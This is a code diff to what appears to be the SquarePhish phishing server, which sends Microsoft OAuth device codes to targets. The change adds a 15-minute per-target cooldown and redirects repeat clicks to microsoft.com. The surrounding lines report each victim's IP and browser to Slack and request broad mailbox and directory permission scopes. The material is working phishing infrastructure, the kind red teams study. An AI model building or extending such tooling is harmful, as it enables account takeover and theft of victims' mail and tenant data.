@@ -28,11 +28,13 @@ from squarephish.modules.server.email import email_usercode
 from squarephish.modules.server.customflask import CustomFlask
 from squarephish.modules.aes128 import decrypt_aes128
 
-
 # Create global Flask app based on config.py
 app = CustomFlask(__name__)
 app.config.from_pyfile("config.py")
 
+# Store email timestamps
+email_cooldown = {}
+COOLDOWN_SECONDS = 15 * 60  # 15 minutes
 
 def init_app(config: ConfigParser, emailer: Emailer) -> redirect:
     """Initialize the Custom Flask app route
@@ -92,8 +94,14 @@ def init_app(config: ConfigParser, emailer: Emailer) -> redirect:
         notify_slack(config.get("SLACK","WEBHOOK"),"QR Accessed / Clicked Link",target_email,request.headers.get('X-Forwarded-For'),request.headers.get('User-Agent'),config.get("SLACK","IPINFO_KEY"))
 
         # Check whether we sent a device code to this user in the past 15 minutes
-        
+        current_time = time.time()
+        last_sent_time = email_cooldown.get(email)
 
+        if last_sent_time and (current_time - last_sent_time < COOLDOWN_SECONDS):
+            logging.info(f"[{target_email}] Device code sent in the last 15 minutes. Will skip sending another one for now...")
+            return redirect("https://microsoft.com/", code=302)
+            
+        email_cooldown[email] = current_time
         # Build the permissions scope
         # user.read mail.read contacts.read user.basic.all user.read.all directory.accessasuser.all application.readwrite.all
         scope = config.get("SERVER", "PERMISSION_SCOPE")
